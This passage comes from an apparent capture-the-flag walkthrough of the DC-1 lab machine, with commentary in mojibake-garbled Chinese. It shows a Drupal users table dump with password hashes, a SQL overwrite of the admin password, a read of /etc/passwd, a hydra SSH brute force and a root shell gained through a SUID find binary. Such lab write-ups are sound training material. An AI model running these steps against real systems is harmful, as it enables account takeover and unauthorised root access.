class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use drupaldb     </span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;    </span><br><span class="line">show tables;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| actions                     |</span><br><span class="line">| authmap                     |</span><br><span class="line">| batch                       |</span><br><span class="line">| block                       |</span><br><span class="line">| block_custom                |</span><br><span class="line">| block_node_type             |</span><br><span class="line">| block_role                  |</span><br><span class="line">| blocked_ips                 |</span><br><span class="line">| cache                       |</span><br><span class="line">| cache_block                 |</span><br><span class="line">| cache_bootstrap             |</span><br><span class="line">| cache_field                 |</span><br><span class="line">| cache_filter                |</span><br><span class="line">| cache_form                  |</span><br><span class="line">| cache_image                 |</span><br><span class="line">| cache_menu                  |</span><br><span class="line">| cache_page                  |</span><br><span class="line">| cache_path                  |</span><br><span class="line">| cache_update                |</span><br><span class="line">| cache_views                 |</span><br><span class="line">| cache_views_data            |</span><br><span class="line">| comment                     |</span><br><span class="line">| ctools_css_cache            |</span><br><span class="line">| ctools_object_cache         |</span><br><span class="line">| date_format_locale          |</span><br><span class="line">| date_format_type            |</span><br><span class="line">| date_formats                |</span><br><span class="line">| field_config                |</span><br><span class="line">| field_config_instance       |</span><br><span class="line">| field_data_body             |</span><br><span class="line">| field_data_comment_body     |</span><br><span class="line">| field_data_field_image      |</span><br><span class="line">| field_data_field_tags       |</span><br><span class="line">| field_revision_body         |</span><br><span class="line">| field_revision_comment_body |</span><br><span class="line">| field_revision_field_image  |</span><br><span class="line">| field_revision_field_tags   |</span><br><span class="line">| file_managed                |</span><br><span class="line">| file_usage                  |</span><br><span class="line">| filter                      |</span><br><span class="line">| filter_format               |</span><br><span class="line">| flood                       |</span><br><span class="line">| <span class="built_in">history</span>                     |</span><br><span class="line">| image_effects               |</span><br><span class="line">| image_styles                |</span><br><span class="line">| menu_custom                 |</span><br><span class="line">| menu_links                  |</span><br><span class="line">| menu_router                 |</span><br><span class="line">| node                        |</span><br><span class="line">| node_access                 |</span><br><span class="line">| node_comment_statistics     |</span><br><span class="line">| node_revision               |</span><br><span class="line">| node_type                   |</span><br><span class="line">| queue                       |</span><br><span class="line">| rdf_mapping                 |</span><br><span class="line">| registry                    |</span><br><span class="line">| registry_file               |</span><br><span class="line">| role                        |</span><br><span class="line">| role_permission             |</span><br><span class="line">| search_dataset              |</span><br><span class="line">| search_index                |</span><br><span class="line">| search_node_links           |</span><br><span class="line">| search_total                |</span><br><span class="line">| semaphore                   |</span><br><span class="line">| sequences                   |</span><br><span class="line">| sessions                    |</span><br><span class="line">| shortcut_set                |</span><br><span class="line">| shortcut_set_users          |</span><br><span class="line">| system                      |</span><br><span class="line">| taxonomy_index              |</span><br><span class="line">| taxonomy_term_data          |</span><br><span class="line">| taxonomy_term_hierarchy     |</span><br><span class="line">| taxonomy_vocabulary         |</span><br><span class="line">| url_alias                   |</span><br><span class="line">| users                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">| variable                    |</span><br><span class="line">| views_display               |</span><br><span class="line">| views_view                  |</span><br><span class="line">| watchdog                    |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><p><code>80å¼ è¡¨å¤ªè¿‡åˆ†äº†ï¼å¯ä»¥çœ‹åˆ°usersè¡¨</code></p><h3 id="3-æŸ¥çœ‹usersè¡¨"><a href="#3-æŸ¥çœ‹usersè¡¨" class="headerlink" title="3.æŸ¥çœ‹usersè¡¨"></a>3.æŸ¥çœ‹usersè¡¨</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users\G  //\Gè¡¨ç¤ºå°†è¡¨æ—‹è½¬90Â°</span><br><span class="line">select * from users\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">             uid: 0</span><br><span class="line">            name: </span><br><span class="line">            pass: </span><br><span class="line">            mail: </span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: 0</span><br><span class="line">          access: 0</span><br><span class="line">           login: 0</span><br><span class="line">          status: 0</span><br><span class="line">        timezone: NULL</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: </span><br><span class="line">            data: NULL</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">             uid: 1</span><br><span class="line">            name: admin</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR</span><br><span class="line">            mail: admin@example.com</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: 1550581826</span><br><span class="line">          access: 1550583852</span><br><span class="line">           login: 1550582362</span><br><span class="line">          status: 1</span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: admin@example.com</span><br><span class="line">            data: b:0;</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">             uid: 2</span><br><span class="line">            name: Fred</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DWGrxef6</span>.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</span><br><span class="line">            mail: fred@example.org</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: filtered_html</span><br><span class="line">         created: 1550581952</span><br><span class="line">          access: 1550582225</span><br><span class="line">           login: 1550582225</span><br><span class="line">          status: 1</span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: fred@example.org</span><br><span class="line">            data: b:0;</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><p><code>å¯ä»¥çœ‹åˆ°cmsçš„ç®¡ç†ç”¨æˆ·åŠ å¯†å¯†ç ï¼Œå‰é¢flag2æç¤ºäº†ï¼Œæš´åŠ›ç ´è§£ä¸æ˜¯å”¯ä¸€æ–¹æ³•ï¼Œé‚£ä¹ˆå°±æ¢ä¸€ä¸ªæ€è·¯</code></p><h3 id="4-ä¿®æ”¹è¦†ç›–adminå¯†ç "><a href="#4-ä¿®æ”¹è¦†ç›–adminå¯†ç " class="headerlink" title="4.ä¿®æ”¹è¦†ç›–adminå¯†ç "></a>4.ä¿®æ”¹è¦†ç›–adminå¯†ç </h3><p><code>ç”¨ä¸€ä¸ªæ–°çš„å¯†ç å¯†æ–‡å°†åŸæ¥çš„å¯†ç è¦†ç›–æ‰ï¼Œæ‰‹åŠ¨ç”Ÿæˆ</code></p><p><code>ä½¿ç”¨PHPè°ƒç”¨scripts/password-hash.shç”Ÿæˆadminçš„å¯†æ–‡</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh admin      </span><br><span class="line">php scripts/password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 <span class="built_in">hash</span>: <span class="variable">$S</span><span class="variable">$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F</span>.KYKPn.qzT7vbfsg27</span><br><span class="line"></span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure><p><code>è¦†ç›–</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use drupaldb;</span><br><span class="line">use drupaldb;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; update users set pass&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;</span><br><span class="line">&lt;s&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;    </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><h2 id="0x09-ç™»å…¥cms"><a href="#0x09-ç™»å…¥cms" class="headerlink" title="0x09.ç™»å…¥cms"></a>0x09.ç™»å…¥cms</h2><p><code>admin/adminç™»å…¥</code></p><img src="/2020/08/21/DC-1/image-20200820233740808.png" class><p><code>æˆåŠŸç™»å…¥</code></p><img src="/2020/08/21/DC-1/image-20200820234010015.png" class><p><code>ç‚¹å‡»ä»ªè¡¨ç›˜å‘ç°flag3</code></p><img src="/2020/08/21/DC-1/image-20200820234207549.png" class><p><code>ç‚¹å‡»flag3</code></p><img src="/2020/08/21/DC-1/image-20200820234432653.png" class><p><code>å‘ç°çº¿ç´¢åœ¨passwdä¸­ï¼ŒæŸ¥çœ‹passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure><p><code>ç»“å°¾å‘ç°flag4ï¼Œå¹¶ä¸”ä¸º/bin/bashï¼Œæ˜¯å¯ä»¥ç™»å…¥çš„ï¼Œå‰æ–‡å·²ç»å‘ç°å¼€å¯äº†22ç«¯å£</code></p><p><code>æ¥ä¸‹æ¥è¿›è¡Œçˆ†ç ´</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment">#hydra -l flag4 -P /usr/share/john/password.lst 192.168.1.6 ssh -vV -f -o hydra.ssh</span></span><br><span class="line">......    //-lç”¨æˆ·åï¼Œ-På­—å…¸ï¼Œ-vVä¸ºçˆ†ç ´è¯¦ç»†ä¿¡æ¯ï¼Œ-fä¸ºå¦‚æœé‡åˆ°æ­£ç¡®çš„å¯†ç åˆ™åœæ­¢çˆ†ç ´ï¼Œ-oè¾“å‡ºæ–‡ä»¶</span><br><span class="line">......</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;delta&quot;</span> - 137 of 3562 [child 2] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;doctor&quot;</span> - 138 of 3562 [child 8] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;fisher&quot;</span> - 139 of 3562 [child 10] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;island&quot;</span> - 140 of 3562 [child 9] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;john&quot;</span> - 141 of 3562 [child 15] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;joshua&quot;</span> - 142 of 3562 [child 0] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;karen&quot;</span> - 143 of 3562 [child 7] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;marley&quot;</span> - 144 of 3562 [child 1] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;orange&quot;</span> - 145 of 3562 [child 12] (0/3)</span><br><span class="line">[22][ssh] host: 192.168.1.3   login: flag4   password: orange</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.1.3 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-20 11:58:01</span><br><span class="line">root@JIYE:~/tmp/DC1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>ç ´è§£å‡ºå¯†ç ä¸ºorange</code></p><p><code>ç™»å…¥</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># ssh flag4@192.168.1.3</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.1.3 (192.168.1.3)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:89B+YqcNl4cSf/BZk26MQG1QeW4BvBlVENMbTRhVhsU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? y</span></span><br><span class="line"><span class="string">Please type &#x27;</span>yes<span class="string">&#x27;, &#x27;</span>no<span class="string">&#x27; or the fingerprint: yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.1.3<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">flag4@192.168.1.3&#x27;</span>s password: </span><br><span class="line">Linux DC-1 3.2.0-6-486 <span class="comment">#1 Debian 3.2.102-1 i686</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">flag4@DC-1:~$</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹æ–‡ä»¶ï¼Œå¾—åˆ°flag4</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line">flag4@DC-1:~$ cat flag4.txt </span><br><span class="line">Can you use this same method to find or access the flag <span class="keyword">in</span> root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it<span class="string">&#x27;s not that easy.  Or maybe it is?</span></span><br><span class="line"><span class="string">flag4@DC-1:~$ </span></span><br></pre></td></tr></table></figure><p><code>æ ¹æ®æç¤ºï¼Œä½ èƒ½ç”¨ç›¸åŒæ–¹æ³•æ‰¾åˆ°rootçš„å—ï¼Ÿæˆ–è®¸å¾ˆéš¾ï¼Œä½†ä¹Ÿä¸ä¸€å®š</code></p><p><code>å°è¯•cdåˆ°rootç”¨æˆ·ä¸‹ï¼Œç»“æœå¤±è´¥ï¼Œæ¥ä¸‹æ¥ææƒ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ <span class="built_in">cd</span> /root/</span><br><span class="line">-bash: <span class="built_in">cd</span>: /root/: Permission denied</span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x10-ææƒ"><a href="#0x10-ææƒ" class="headerlink" title="0x10.ææƒ"></a>0x10.ææƒ</h2><blockquote><p>æŸ¥çœ‹ç³»ç»Ÿå‘½ä»¤å½“ä¸­æ˜¯å¦æœ‰SUIDæ ‡è¯†ã€‚</p><p>SUIDæ ‡è¯†ä¸ºåœ¨å‘½ä»¤æ‰§è¡Œæ—¶å°†çŸ­æš‚è·å¾—rootæƒé™ï¼Œé€šè¿‡å…·æœ‰SUIDæ ‡è¯†çš„å‘½ä»¤è¿è¡Œbashï¼Œè¿™æ—¶bashå°±æœ‰rootæƒé™ã€‚</p><p>rootä¿¡ä»»SUIDï¼ŒSUIDä¿¡ä»»bashï¼Œbashå°±æœ‰äº†rootæƒé™</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null   // æŸ¥çœ‹å…·æœ‰SUIDçš„å‘½ä»¤</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">flag4@DC-1:~$ </span><br></pre></td></tr></table></figure><p><code>å‘ç°findå°±å¯ä»¥</code></p><p><code>ä¸‹é¢è¿›è¡Œåˆ©ç”¨</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ find /root -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \; </span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">flag4@DC-1:~$ </span><br></pre></td></tr></table></figure><p><code>å¯ä»¥å‘ç°ä¸ºroot</code></p><p><code>ææƒ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ find /root -<span class="built_in">exec</span> <span class="string">&quot;/bin/bash&quot;</span> \;      </span><br><span class="line">bash-4.2$ id</span><br><span class="line">uid=1001(flag4) gid=1001(flag4) groups=1001(flag4)</span><br><span class="line">bash-4.2$ </span><br></pre></td></tr></table></figure><p><code>eç¿»è½¦äº†ï¼å†æ¢ä¸ªæ–¹æ³•</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ find /root -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;    </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1001(flag4) gid=1001(flag4) euid=0(root) groups=0(root),1001(flag4)</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure><p><code>æˆåŠŸäº†ğŸ˜­</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/flag4</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">thefinalflag.txt</span><br><span class="line"><span class="comment"># cat thefinalflag.txt</span></span><br><span class="line">Well <span class="keyword">done</span>!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you<span class="string">&#x27;ve enjoyed this and learned some new skills.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You can let me know what you thought of this little journey</span></span><br><span class="line"><span class="string">by contacting me via Twitter - @DCAU7</span></span><br><span class="line"><span class="string"># </span></span><br></pre></td></tr></table></figure><h2 id="0x11-æ¥ä¸‹æ¥å°±æ˜¯æ“¦å±è‚¡èµ°äººäº†ï¼Œå¹²ä¸åŠ¨äº†ã€‚ã€‚ã€‚"><a href="#0x11-æ¥ä¸‹æ¥å°±æ˜¯æ“¦å±è‚¡èµ°äººäº†ï¼Œå¹²ä¸åŠ¨äº†ã€‚ã€‚ã€‚" class="headerlink" 